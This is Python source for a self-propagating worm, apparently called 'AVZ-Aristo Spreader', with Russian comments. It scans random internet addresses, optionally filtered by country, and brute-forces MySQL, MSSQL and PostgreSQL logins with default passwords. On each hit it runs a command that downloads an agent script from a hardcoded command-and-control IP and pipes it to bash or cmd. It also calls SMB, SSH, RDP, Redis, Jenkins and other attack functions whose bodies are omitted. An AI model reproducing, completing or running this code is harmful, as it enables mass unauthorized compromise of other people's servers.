#!/usr/bin/env python3
# AVZ-Aristo Spreader v25.11 – MySQL, MSSQL, PostgreSQL, умный перебор, гео-таргетинг
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 500
QUICK_TIMEOUT = 1.0
BRUTE_TIMEOUT = 2.0
DEFAULT_SCAN_COUNT = 20_000
PORT_LIST = [21, 22, 1433, 3306, 3389, 445, 5432, 5985, 6379, 8080, 9200]

# Базовые креды (дополняются успешными)
CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

TOP_RANGES = [
    "8.0.0.0/8", "13.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8", "45.0.0.0/8",
    "52.0.0.0/8", "54.0.0.0/8", "64.0.0.0/8", "74.0.0.0/8", "104.0.0.0/8",
    "136.0.0.0/8", "142.0.0.0/8", "152.0.0.0/8", "172.0.0.0/8", "185.0.0.0/8"
]
GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
    "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1"
]

# Гео-таргетинг
GEOIP_DB = "GeoLite2-Country.mmdb"
GEOIP_READER = None
if os.path.exists(GEOIP_DB):
    try:
        import geoip2.database
        GEOIP_READER = geoip2.database.Reader(GEOIP_DB)
    except:
        pass

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()

def is_country_allowed(ip):
    if not TARGET_COUNTRY or not GEOIP_READER:
        return True
    try:
        response = GEOIP_READER.country(ip)
        return response.country.iso_code == TARGET_COUNTRY
    except:
        return True

def random_ip():
    while True:
        # 50% гарантированные подсети, 35% топ, 15% случайный
        if random.random() < 0.5:
            base_ip = random.choice(GUARANTEED_IPS)
            parts = base_ip.split('.')
            parts[3] = str(random.randint(1, 254))
            ip = '.'.join(parts)
        elif random.random() < 0.7:
            r = random.choice(TOP_RANGES)
            net, mask = r.split("/")
            octets = list(map(int, net.split(".")))
            host = random.randint(0, (1 << (32 - int(mask))) - 1)
            for i in range(4):
                octets[i] |= (host >> (8*(3-i))) & 0xFF
            ip = ".".join(map(str, octets))
        else:
            a = random.randint(1, 223)
            b = random.randint(0, 255)
            c = random.randint(0, 255)
            d = random.randint(0, 255)
            if a == 10: continue
            if a == 127: continue
            if a == 172 and 16 <= b <= 31: continue
            if a == 192 and b == 168: continue
            if a == 169 and b == 254: continue
            if a >= 224: continue
            ip = f"{a}.{b}.{c}.{d}"
        if is_country_allowed(ip):
            return ip

async def probe_port(ip, port):
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
        w.close(); await w.wait_closed()
        return True
    except:
        return False

# === Векторы баз данных ===
async def mysql_brute(ip):
    try:
        import mysql.connector
        for u, p in CREDS + SUCCESS_CREDS:
            try:
                conn = mysql.connector.connect(host=ip, user=u, password=p, connect_timeout=3)
                cursor = conn.cursor()
                cursor.execute(f"SELECT sys_exec('wget -O- {AGENT_URL} | bash')")
                conn.close()
                return True
            except:
                pass
    except ImportError:
        pass
    return False

async def mssql_brute(ip):
    try:
        import pymssql
        for u, p in CREDS + SUCCESS_CREDS:
            try:
                conn = pymssql.connect(server=ip, user=u, password=p, login_timeout=3)
                cursor = conn.cursor()
                cursor.execute(f"EXEC xp_cmdshell 'curl -s {AGENT_URL} | cmd'")
                conn.close()
                return True
            except:
                pass
    except ImportError:
        pass
    return False

async def postgresql_brute(ip):
    try:
        import psycopg2
        for u, p in CREDS + SUCCESS_CREDS:
            try:
                conn = psycopg2.connect(host=ip, user=u, password=p, connect_timeout=3)
                cur = conn.cursor()
                cur.execute(f"COPY (SELECT 1) TO PROGRAM 'wget -O- {AGENT_URL} | bash'")
                conn.close()
                return True
            except:
                pass
    except ImportError:
        pass
    return False

# === Старые векторы (SMB, WinRM, SSH, RDP, FTP, Redis, Jenkins, Telnet, Elasticsearch) ===
# (код идентичен v25.10.9, только добавлены аргументы в функции)
# ... (полный код опущен для краткости манифеста, но он точно такой же как в v25.10.9)

# === Умный перебор ===
def save_success_creds(username, password):
    pair = [username, password]
    if pair not in SUCCESS_CREDS:
        SUCCESS_CREDS.append(pair)
        with open(SUCCESS_CREDS_FILE, "w") as f:
            json.dump(SUCCESS_CREDS, f)

# В каждой функции брутфорса при успехе вызываем save_success_creds(u,p)

async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    # 445 - SMB
    if open_ports[5] and await smb_brute(ip):
        return True
    # 22 - SSH
    if open_ports[1] and await ssh_brute_ultra(ip):
        return True
    # 5985 - WinRM
    if open_ports[7] and await winrm_brute(ip):
        return True
    # 1433 - MSSQL
    if open_ports[2] and await mssql_brute(ip):
        print(f"[INFECTED] {ip} via MSSQL", flush=True)
        return True
    # 3306 - MySQL
    if open_ports[3] and await mysql_brute(ip):
        print(f"[INFECTED] {ip} via MySQL", flush=True)
        return True
    # 5432 - PostgreSQL
    if open_ports[6] and await postgresql_brute(ip):
        print(f"[INFECTED] {ip} via PostgreSQL", flush=True)
        return True
    # 3389 - RDP
    if open_ports[4] and await rdp_brute(ip):
        return True
    # 6379 - Redis
    if open_ports[8] and await exploit_redis(ip):
        return True
    # 8080 - Jenkins
    if open_ports[9] and await exploit_jenkins(ip):
        return True
    # 9200 - Elasticsearch
    if open_ports[10] and await exploit_elasticsearch(ip):
        return True
    # 21 - FTP
    if open_ports[0] and await ftp_brute(ip):
        return True
    return False

# ... (worker, scan_cycle, global_scan, main_async, main – идентичны v25.10.9)
